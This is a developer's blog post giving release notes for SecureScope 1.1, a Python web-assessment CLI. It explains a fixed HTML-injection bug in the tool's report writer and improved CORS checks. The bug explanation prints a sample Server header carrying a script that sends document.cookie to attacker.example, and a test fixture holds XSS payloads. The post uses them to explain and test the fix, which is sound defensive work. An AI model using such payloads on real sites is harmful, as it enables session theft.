---
title: "SecureScope 1.1: fixing a security bug in my own security tool"
description: The release notes, and the part I think is worth reading even if you never run it.
date: 2026-10-18 06:00:00 +0300
category: Tooling
tags: [securescope, tooling, python, html-injection, cors]
---

[SecureScope](https://github.com/mohamedmoatazsec/SecureScope) is my open-source Python CLI for
the first hour of a web assessment: security headers, cookie flags, TLS, CORS, HTTP methods, a
bit of recon, and a report with recommendations sorted by severity. Version 1.1 is out. Most of
the changes are what you would expect from a project growing up, but one of them is a security
fix, and it is a good example of a bug class that shows up in security tooling far more often
than it should.

<!--more-->

> **Update — October 2026:** SecureScope has since been rewritten. The current tool is **2.0** —
> a proper finding model, a CSP evaluator, grades, SARIF output and a CI gate — described in
> [SecureScope 2.0]({{ '/writeups/2026/securescope-2-0/' | relative_url }}). The HTML-injection
> fix below still stands (in 2.0 it became a rule across every output); the version number and
> `pip install .` command here predate the rewrite.

## The bug: a report that trusted the target

SecureScope can write an HTML report. The 1.0 report writer did this:

```python
html += f"<tr><td>{key}</td><td>{value}</td></tr>"
```

Every `value` in that loop came from the scanned site: the `Server` header, cookie names,
`robots.txt` rules, WHOIS fields. None of it was escaped. So a target that answered with

```http
Server: </td><script>fetch('https://attacker.example/?c='+document.cookie)</script>
```

would get its script into the report, and the script would run in the browser of whoever opened
it. For a one-off scan of your own site that is a curiosity. For an analyst who scans a hostile
host and opens the report on a workstation with other tabs open, it is a stored HTML injection
delivered through their own tooling.

The fix is not interesting, which is the point. Every value from the target now goes through
`html.escape` before it touches the document, and there is a test that feeds the report writer a
hostile `Server` header, cookie name and `robots.txt` line and asserts that no raw `<script` or
`<img` tag survives.

```python
def test_html_report_escapes_values_from_the_target():
    hostile = {
        "technologies": {"headers": {"Server": "<script>alert(1)</script>"}},
        "cookies": [{"name": '"><img src=x onerror=alert(1)>'}],
    }
    html = render_html(hostile)
    assert "<script" not in html
    assert "<img" not in html
```

The lesson I am taking from it: **a security tool's output is an attack surface.** Anything a
scanner, proxy or recon script renders for a human is data from the target, and the target may
not like you. Treat report writers with the same suspicion as a web app's templates.

## CORS detection that detects the real thing

1.0 flagged a CORS misconfiguration only when `Access-Control-Allow-Origin: *` was combined
with `Access-Control-Allow-Credentials: true`. Browsers already refuse that combination, so the
check mostly produced findings nobody could exploit.

1.1 sends a probe `Origin` (`https://securescope-probe.invalid`) and flags the case that matters:
the probe origin reflected back in `Access-Control-Allow-Origin` with credentials enabled. That
is the configuration that lets a page on any domain read authenticated responses from the
target. It also flags `null` origins with credentials, which sandboxed iframes and some redirect
chains can produce, and it still reports the wildcard case, downgraded to what it is: a sign of
a careless policy rather than a direct exploit.

```python
result = analyze_cors(
    {"Access-Control-Allow-Origin": PROBE_ORIGIN,
     "Access-Control-Allow-Credentials": "true"}
)
assert result["vulnerable"] is True
assert result["finding"] == "Arbitrary origin reflected with credentials"
```

## The rest of the release

- **Installable.** `pip install .` gives you a `securescope` command. `python cli.py` still works.
- **Cookie flags done properly.** `HttpOnly` is read from the cookie's attributes instead of the
  string form of the cookie, and `SameSite` is reported and recommended.
- **No more crash on an unreachable target.** The header scan used to return `None`, and the
  recommendation engine fell over on it.
- **A `403` to a probed HTTP method is "not allowed",** not "allowed". A refused method is not a
  finding.
- **Real tests.** 26 pytest cases covering the parsing and analysis logic, no network needed,
  running in about a tenth of a second.
- **CI that tests the code** on Python 3.9 through 3.13, instead of the old workflow, which
  port-scanned a third-party site on every push. That was never a good idea.
- `--output DIR`, `--skip-ports`, `--skip-subdomains`, `--version`, and bare hostnames default
  to `https://`.
- An honest README. The old tagline said "AI-powered". There was no AI in it, and the roadmap
  said as much. It now says what the tool does.

## What it is for, and what it is not

SecureScope is the reconnaissance and configuration-review phase of a web assessment made
repeatable: the checks you run on every target before you start looking for application-level
bugs. It is not a vulnerability scanner and it will not find your IDORs. Use it to get the
boring findings out of the way in two minutes so you can spend the engagement on the ones that
need a human.

Only run it against systems you own or have explicit, written permission to test.

The code is MIT-licensed at
[github.com/mohamedmoatazsec/SecureScope](https://github.com/mohamedmoatazsec/SecureScope).
Issues and pull requests are welcome, and `SECURITY.md` explains how to report a problem in the
tool itself privately.
